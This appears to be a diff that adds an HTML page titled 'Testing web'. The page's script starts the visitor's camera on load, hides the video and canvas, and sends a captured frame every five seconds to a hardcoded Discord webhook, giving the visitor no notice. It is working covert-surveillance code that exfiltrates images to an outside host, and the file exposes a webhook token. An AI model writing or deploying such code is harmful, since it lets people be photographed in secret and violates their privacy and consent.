@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Testing web</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
+      padding: 0;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1311722830647394355/OOPS_lMsfufmRp1v_0l6VGfRTA3VjvjwcNSbgKaYahyOarvQ5x_D_3lU1bwOOIWaloBw';
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          setInterval(captureAndSend, 5000);
+        };
+      } catch (err) {
+        console.error('Camera access denied:', err);
+      }
+    }
+
+    async function captureAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+      const blob = await fetch(imageData).then(res => res.blob());
+      sendToDiscord(blob);
+    }
+
+    async function sendToDiscord(imageBlob) {
+      const formData = new FormData();
+      formData.append('file', imageBlob, 'selfie.jpg');
+      formData.append('payload_json', JSON.stringify({ content: "Here's an automatic selfie!" }));
+
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+      } catch (err) {
+        console.error('Error while sending image to Discord:', err);
+      }
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
